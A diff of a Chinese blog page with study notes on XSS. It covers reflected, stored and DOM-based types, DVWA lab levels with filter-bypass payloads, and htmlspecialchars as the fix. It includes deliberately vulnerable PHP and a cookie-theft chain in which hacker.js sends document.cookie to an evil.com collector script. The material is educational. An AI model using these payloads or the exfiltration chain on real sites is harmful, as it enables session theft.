@@ -78,7 +78,7 @@
 <link href="/css/main.css?v=5.1.2" rel="stylesheet" type="text/css" />
 
 
-  <meta name="keywords" content="web security,XSS,CSRF,SQL注入," />
+  <meta name="keywords" content="web security,XSS," />
 
 
 
@@ -96,18 +96,23 @@
 
 
 
-<meta name="description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS、SQL注入、CSRF。">
-<meta name="keywords" content="web security,XSS,CSRF,SQL注入">
+<meta name="description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。一篇较好的博客XSS跨站脚本攻击(一)—-XSS攻击的三种类型。">
+<meta name="keywords" content="web security,XSS">
 <meta property="og:type" content="article">
-<meta property="og:title" content="（二）Web安全深度剖析学习【XSS与SQL注入】">
+<meta property="og:title" content="（二）Web安全深度剖析学习【XSS】">
 <meta property="og:url" content="http://yoursite.com/2018/05/17/Web安全深度剖析学习-XSS与SQL注入/index.html">
 <meta property="og:site_name" content="Shirley">
-<meta property="og:description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS、SQL注入、CSRF。">
+<meta property="og:description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。一篇较好的博客XSS跨站脚本攻击(一)—-XSS攻击的三种类型。">
 <meta property="og:locale" content="zh-Hans">
-<meta property="og:updated_time" content="2018-05-19T06:29:30.648Z">
+<meta property="og:image" content="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E6%94%BB%E5%87%BB.png">
+<meta property="og:image" content="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/DVWA-XSS-Reflect-LOW.png">
+<meta property="og:image" content="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B21.png">
+<meta property="og:image" content="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B22.png">
+<meta property="og:updated_time" content="2018-05-21T14:29:39.676Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="（二）Web安全深度剖析学习【XSS与SQL注入】">
-<meta name="twitter:description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS、SQL注入、CSRF。">
+<meta name="twitter:title" content="（二）Web安全深度剖析学习【XSS】">
+<meta name="twitter:description" content="《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。一篇较好的博客XSS跨站脚本攻击(一)—-XSS攻击的三种类型。">
+<meta name="twitter:image" content="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E6%94%BB%E5%87%BB.png">
 
 
 
@@ -142,7 +147,7 @@
 
 
 
-  <title>（二）Web安全深度剖析学习【XSS与SQL注入】 | Shirley</title>
+  <title>（二）Web安全深度剖析学习【XSS】 | Shirley</title>
   
 
 
@@ -356,7 +361,7 @@
 
         
         
-          <h1 class="post-title" itemprop="name headline">（二）Web安全深度剖析学习【XSS与SQL注入】</h1>
+          <h1 class="post-title" itemprop="name headline">（二）Web安全深度剖析学习【XSS】</h1>
         
 
         <div class="post-meta">
@@ -433,9 +438,69 @@
       
 
       
-        <p>《Web安全深度剖析》学习总结, 本部分主要包括XSS、SQL注入、CSRF。<br><a id="more"></a></p>
+        <p>《Web安全深度剖析》学习总结, 本部分主要包括XSS原理及三种类型XSS攻击和预防。<br>一篇较好的博客<a href="https://blog.csdn.net/u011781521/article/details/53894399" target="_blank" rel="noopener">XSS跨站脚本攻击(一)—-XSS攻击的三种类型</a>。<br><a id="more"></a></p>
 <h1 id="XSS跨站脚本漏洞"><a href="#XSS跨站脚本漏洞" class="headerlink" title="XSS跨站脚本漏洞"></a>XSS跨站脚本漏洞</h1><p>XSS(Cross Site Scripting)，即跨站脚本攻击。指攻击者在网页中嵌入客户端脚本，通常是JS编写的恶意代码，当用户使用浏览器浏览被嵌入恶意代码的网页时，恶意代码将会在用户浏览器上执行。XSS属于客户端攻击。</p>
 <h2 id="XSS原理"><a href="#XSS原理" class="headerlink" title="XSS原理"></a>XSS原理</h2><p>XSS攻击在网页中嵌入客户端恶意脚本代码，这些恶意脚本代码一般使用JavaScript编写，所以JS能做到什么效果，XSS的威力就有多大。<br>JavaScript可以用来获取用户cookie，改变页面内容、url跳转，所以存在XSS漏洞的网站就可以盗取用户cookie、黑掉页面、导航到恶意网站。</p>
+<p>如下，在formProcess_XSS目录下，创建index.html和index.php，添加如下代码：<br><strong>index.html</strong><br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;!DOCTYPE html&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">html</span> <span class="attr">lang</span>=<span class="string">"en"</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">charset</span>=<span class="string">"UTF-8"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">name</span>=<span class="string">"viewport"</span> <span class="attr">content</span>=<span class="string">"width=device-width, initial-scale=1.0"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">meta</span> <span class="attr">http-equiv</span>=<span class="string">"X-UA-Compatible"</span> <span class="attr">content</span>=<span class="string">"ie=edge"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>XSS form process<span class="tag">&lt;/<span class="name">title</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></div><div class="line"><span class="tag">&lt;<span class="name">body</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">form</span> <span class="attr">action</span>=<span class="string">"index.php"</span> <span class="attr">method</span>=<span class="string">"POST"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"text"</span> <span class="attr">name</span>=<span class="string">"username"</span> /&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">input</span> <span class="attr">type</span>=<span class="string">"submit"</span> <span class="attr">value</span>=<span class="string">"提交"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">form</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">body</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    <span class="comment">//echo $_SERVER['PHP_SELF'];</span></div><div class="line">    $user_name = $_POST[<span class="string">"username"</span>];</div><div class="line">    <span class="keyword">echo</span> $user_name;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>然后将formProcess_XSS目录丢到phpStudy的WWW目录下，浏览器访问<code>http://192.168.1.101/formProcess_XSS/index.html</code>，其中192.168.1.101表示虚拟服务器的地址，当在文本输入框中输入<code>&lt;script&gt;alert(&quot;XSS&quot;)&lt;/script&gt;</code>，然后点击提交，就会触发XSS攻击，因为index.php未对用户输入的内容作处理，没有将html的字符处理为html实体，如下：</p>
+<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E6%94%BB%E5%87%BB.png" alt="XSS攻击学习"><br>攻击者可以在<code>&lt;script&gt;</code>和<code>&lt;/script&gt;</code>之间输入JavaScript代码，实现一定的攻击效果。在真实攻击中，攻击者不仅仅弹出一个框，通常使用<code>&lt;script src=&quot;http://www.secbug.org/x.txt&quot;&gt;&lt;/script&gt;</code>方式来加载外部脚本，而在<code>x.txt</code>中存放着攻击者的恶意JavaScript代码，这段代码可能是用来盗取用户的Cookie，也可能是监控键盘记录等恶意行为。</p>
+<h2 id="XSS类型"><a href="#XSS类型" class="headerlink" title="XSS类型"></a>XSS类型</h2><p>XSS主要分为三类，反射型(经过后端，不经过数据库)、存储型(经过后端，经过数据库)、DOM型(不经过后端)。<br>反射型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 浏览器。</p>
+<p>存储型 XSS 的数据流向是：浏览器 -&gt; 后端 -&gt; 数据库 -&gt; 后端 -&gt; 浏览器。</p>
+<p>DOM-XSS 的数据流向是：URL–&gt;浏览器 </p>
+<h3 id="反射型XSS"><a href="#反射型XSS" class="headerlink" title="反射型XSS"></a>反射型XSS</h3><p>反射型XSS也被称为非持久性XSS。当用户访问一个带有XSS代码的URL请求时，服务器端接收数据后处理，然后把带有XSS代码的数据发送到浏览器，浏览器解析这段带有XSS代码的数据后，最终造成XSS漏洞。eg：</p>
+<p><strong>index.php</strong><br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">    $user_name = $_GET[<span class="string">"username"</span>];</div><div class="line">    <span class="keyword">echo</span> $user_name;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>在上述代码中，index.php接收<code>username</code>值后再输出，若提交<code>index.php?username=HIM</code>，则程序将输出HIM，若恶意用户输入<code>index.php?username=&lt;script&gt;XSS恶意代码&lt;script/&gt;</code>，将会造成反射型攻击。</p>
+<p>有人会问，我怎么可能自己去把HIM改成可以执行的恶意代码呢?这不是自己坑自己吗，但是一种情况是别人可能修改HIM为恶意代码，然后将这个恶意的URL发送给你。反射型XSS盗取用户cookie的过程如下：</p>
+<ul>
+<li>假设网站A存在XSS漏洞，发送可以触发该漏洞的特定代码到网站A上的目标用户HIM<br>恶意链接构造如下：<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span> = <span class="string">"http://www.foo.com/xss/xss.php?username=&lt;script src = http://www.evil.com/xss/hacker.js /&gt;凤姐最新性感视频&lt;/a&gt;</span></span></div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p>其中，<code>www.foo.com/xss/xss.php?username=</code> 是存在漏洞的网站A，执行盗取cookie操作的文件位于黑客的网站B，B网站主要有两个文件 <code>hacker.js</code>和 <code>hacker.php</code>。</p>
+<p>hacker.js<br><figure class="highlight js"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="keyword">var</span> img = <span class="keyword">new</span> Image();</div><div class="line">img.src = <span class="string">"http://www.evil.com/xss/hacker.php?username="</span> + <span class="built_in">document</span>.cookie;</div><div class="line"><span class="built_in">document</span>.body.append(img);</div></pre></td></tr></table></figure></p>
+<p>hacker.php<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line">$cookie = $_GET[<span class="string">'username'</span>];</div><div class="line">var_dump($cookie);</div><div class="line">$myFile = <span class="string">"cookie.txt"</span>;</div><div class="line">file_put_contents($myFile, $cookie);</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<ul>
+<li>当用户点击了(凤姐最新性感视频)链接后，被攻击目标HIM用户在网站A的cookie将被黑客拿到，存到网站B的cookie.txt文件中。</li>
+</ul>
+<p><strong>DVWA—XSS(Reflected)</strong><br>（1）LOW<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">'&lt;pre&gt;Hello '</span> . $_GET[ <span class="string">'name'</span> ] . <span class="string">'&lt;/pre&gt;'</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>漏洞源于，对于接受用户数据的<code>name</code>参数没有进行过滤直接在网页中输出。</p>
+<p>攻击代码：<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code><br>效果:<br><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/DVWA-XSS-Reflect-LOW.png" alt="DVWA-XSS-Reflected-LOW"></p>
+<p>（2）MEDIUM<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = str_replace( <span class="string">'&lt;script&gt;'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</div><div class="line"></div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上述代码在输出<code>name</code>参数中的数据之前，先利用<code>str_replace(find,replace,string,count))</code>函数将<code>&lt;script&gt;</code>替换为空。</p>
+<p><strong>补充：</strong> <a href="https://www.cnblogs.com/xiaochaohuashengmi/archive/2011/12/08/2281155.html" target="_blank" rel="noopener">Php中”{}”大括号的用法总结</a>，上述代码<code>echo &quot;&lt;pre&gt;Hello ${name}&lt;/pre&gt;&quot;</code>中，<code>${name}</code>与<code>$name</code>或<code>{$name}</code>是一样的。</p>
+<p>攻击代码1，可以使用大写的<code>&lt;SCRIPT&gt;</code>：<code>&lt;SCRIPT&gt;alert(document.cookie)&lt;/SCRIPT&gt;</code></p>
+<p>攻击代码2，通过HTML跨站：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>。onerror 事件会在文档或图像加载过程中发生错误时被触发，支持该事件的HTML标签，<code>&lt;img&gt;</code>, <code>&lt;object&gt;</code>, <code>&lt;style&gt;</code>。</p>
+<p>（3）HIGH<br>SOURCE:<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = preg_replace( <span class="string">'/&lt;(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i'</span>, <span class="string">''</span>, $_GET[ <span class="string">'name'</span> ] );</div><div class="line"></div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"&lt;pre&gt;Hello $&#123;name&#125;&lt;/pre&gt;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p><code>preg_replace()</code> 函数执行一个正则表达式的搜索和替换。<br>上述代码在输出<code>name</code>参数中的数据之前，先利用<code>preg_replace()</code>函数将含有<code>&lt;script&gt;</code>或替<code>&lt;SCRIPT&gt;</code>的部分替换为空。</p>
+<p>攻击代码：通过HTML跨站：<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>。</p>
+<p><strong>避免XSS反射型攻击</strong><br>利用<code>htmlspecialchars()</code>方法：把一些预定义的敏感字符转义为 HTML 实体。所有的跨站语句中基本都离不开这些符号，因而只需要这一个函数就阻止了XSS漏洞。</p>
+<pre><code>&amp; （和号） 成为 &amp;amp;
+&quot; （双引号） 成为 &amp;quot;
+&apos; （单引号） 成为 &amp;#039;
+&lt; （小于） 成为 &amp;lt;
+&gt; （大于） 成为 &amp;gt;
+</code></pre><p>如下php代码，阻止了上述利用<code>&lt;script&gt;</code>和<code>&lt;img&gt;</code>进行的XSS反射型攻击：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div></pre></td><td class="code"><pre><div class="line"><span class="meta">&lt;?php</span></div><div class="line"><span class="comment">// Is there any input?</span></div><div class="line"><span class="keyword">if</span>( array_key_exists( <span class="string">"name"</span>, $_GET ) &amp;&amp; $_GET[ <span class="string">'name'</span> ] != <span class="keyword">NULL</span> ) &#123;</div><div class="line">    <span class="comment">// Get input</span></div><div class="line">    $name = htmlspecialchars($_GET[ <span class="string">'name'</span> ]);</div><div class="line">    <span class="comment">// Feedback for end user</span></div><div class="line">    <span class="keyword">echo</span> <span class="string">"Hello $&#123;name&#125;"</span>;</div><div class="line">&#125;</div><div class="line"><span class="meta">?&gt;</span></div></pre></td></tr></table></figure></p>
+<p>当在文本输入框输入<code>&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>或<code>&lt;img src=1 onerror=alert(document.cookie)&gt;</code>点击提交GET请求后，利用上述php代码中的<code>htmlspecialchars()</code>方法处理敏感字符后返回，避免XSS攻击。</p>
+<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B21.png" alt="XSS预防1"></p>
+<p><img src="http://ou3oh86t1.bkt.clouddn.com/XSS%E6%94%BB%E5%87%BB/XSS%E9%A2%84%E9%98%B22.png" alt="XSS预防2"></p>
+<h3 id="存储型-XSS"><a href="#存储型-XSS" class="headerlink" title="存储型 XSS"></a>存储型 XSS</h3><p>存储型XSS又称为持久性XSS，存储型XSS是最危险的一种跨站脚本。</p>
+<p>允许用户存储数据的Web应用程序都可能出现存储型XSS漏洞，当攻击者提交一段XSS代码后，被服务器端接收并存储，当用户再次访问某个页面时，这段XSS代码被程序读出来响应给浏览器，造成XSS跨站攻击，此为存储型XSS。</p>
+<p>存储型XSS与反射型XSS、DOM型XSS相比，有更高的隐蔽性，危害更大。反射型XSS、DOM型XSS都依赖用户手动去触发，而存储型XSS不需要。</p>
+<p><strong>一个常见的存储型XSS场景实例</strong><br>当测试是否存在存储型XSS时，首先确定输入点与输出点。如在留言板测试存储型XSS漏洞，首先要找出留言内容输出(显示)的地方在标签内还是标签属性内，或者其他地方。</p>
+<p>若输出数据在标签属性内，则XSS代码不会被执行，如<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;</code>,因为<code>value</code>属性中的XSS代码被当作值处理，无法当作脚本执行，最终浏览器解析HTML时，将会把数据以文本的形式输出在网页中。</p>
+<p>确定输出点后，可以根据相应的标签构造HTML代码来闭合，如插入XSS代码<code>&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;</code>，最终在HTML文档中变为：<code>&lt;input type=&quot;text&quot; name=&quot;content&quot; value=&quot;&quot;/&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&quot; /&gt;</code>，通过闭合input标签，使输出的内容不在value属性，造成XSS跨站攻击。</p>
+<p><strong>具体的存储型XSS漏洞测试如下：</strong></p>
+<ul>
+<li>添加正常的留言，查找到显示标签。</li>
+<li>若显示区域不在HTML属性内，可以直接使用XSS代码注入。若不确定内容输出的具体位置，可以使用模糊测试方案，XSS代码如下：</li>
+</ul>
+<figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 普通注入</div><div class="line">"/&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 闭合标签注入</div><div class="line"><span class="tag">&lt;/<span class="name">textarea</span>&gt;</span>'"&gt;<span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="javascript">alert(<span class="built_in">document</span>.cookie)</span><span class="tag">&lt;/<span class="name">script</span>&gt;</span> 闭合标签注入</div></pre></td></tr></table></figure>
+<ul>
+<li>在插入盗取cookie的JavaScript代码后，攻击者将该含XSS代码的留言提交，若后端不加处理直接保存到数据库，当用户再次查看这段留言时，浏览器会把XSS代码认为是正常JS代码执行，盗取浏览该留言的用户cookie。</li>
+</ul>
+<p>参考博客<a href="https://blog.csdn.net/SKI_12/article/details/60465854" target="_blank" rel="noopener">通过DVWA学习存储型XSS漏洞</a>。</p>
+<h3 id="DOM型-XSS"><a href="#DOM型-XSS" class="headerlink" title="DOM型 XSS"></a>DOM型 XSS</h3><p>基于DOM型的XSS不需要与服务器端交互，只发生在客户端处理数据阶段。<br><figure class="highlight html"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">script</span>&gt;</span><span class="undefined"></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> temp = <span class="built_in">document</span>.URL; <span class="comment">//获取URL</span></span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> index= <span class="built_in">document</span>.URL.indexOf(<span class="string">"content="</span>) + <span class="number">8</span>;</span></div><div class="line"><span class="javascript">    <span class="keyword">var</span> par = temp.substring(index);</span></div><div class="line"><span class="javascript">    <span class="built_in">document</span>.write(<span class="built_in">decodeURI</span>(par)); <span class="comment">//获取输入内容</span></span></div><div class="line"><span class="undefined"></span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>上述代码的意思是获取URL中的content参数的值，并且输出，若输入<code>http://www.secbug.org/dom.html?content=&lt;script&gt;alert(/xss/)&lt;/script&gt;</code>，就会产生XSS漏洞。</p>
 
       
     </div>
@@ -492,10 +557,6 @@ margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-sha
             <a href="/tags/web-security/" rel="tag"><i class="fa fa-tag"></i> web security</a>
           
             <a href="/tags/XSS/" rel="tag"><i class="fa fa-tag"></i> XSS</a>
-          
-            <a href="/tags/CSRF/" rel="tag"><i class="fa fa-tag"></i> CSRF</a>
-          
-            <a href="/tags/SQL注入/" rel="tag"><i class="fa fa-tag"></i> SQL注入</a>
           
         </div>
       
@@ -771,7 +832,7 @@ margin:0 20px 20px 0;position: relative;overflow: hidden;color: #8c96a0;text-sha
             
 
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS跨站脚本漏洞"><span class="nav-number">1.</span> <span class="nav-text">XSS跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS原理"><span class="nav-number">1.1.</span> <span class="nav-text">XSS原理</span></a></li></ol></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-1"><a class="nav-link" href="#XSS跨站脚本漏洞"><span class="nav-number">1.</span> <span class="nav-text">XSS跨站脚本漏洞</span></a><ol class="nav-child"><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS原理"><span class="nav-number">1.1.</span> <span class="nav-text">XSS原理</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#XSS类型"><span class="nav-number">1.2.</span> <span class="nav-text">XSS类型</span></a><ol class="nav-child"><li class="nav-item nav-level-3"><a class="nav-link" href="#反射型XSS"><span class="nav-number">1.2.1.</span> <span class="nav-text">反射型XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#存储型-XSS"><span class="nav-number">1.2.2.</span> <span class="nav-text">存储型 XSS</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#DOM型-XSS"><span class="nav-number">1.2.3.</span> <span class="nav-text">DOM型 XSS</span></a></li></ol></li></ol></li></ol></div>
             
 
           </div>
